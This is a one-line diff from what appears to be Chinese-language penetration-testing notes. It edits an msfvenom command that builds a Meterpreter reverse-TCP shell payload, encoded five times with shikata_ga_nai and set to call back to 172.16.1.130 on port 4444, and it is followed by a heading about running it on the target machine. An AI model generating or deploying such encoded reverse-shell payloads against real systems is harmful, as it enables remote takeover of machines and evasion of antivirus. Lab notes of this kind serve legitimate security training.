@@ -404,7 +404,7 @@ micro8前辈 https://micro8.gitbook.io/micro8/contents-1#71-80-ke
 https://github.com/clinicallyinane/shellcode_launcher
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -e x86/shikata_ga_nai -i 5 -f raw > test.c
+msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -e x86/shikata_ga_nai -i 5 -f raw > test.c
 ```
 
 靶机执行
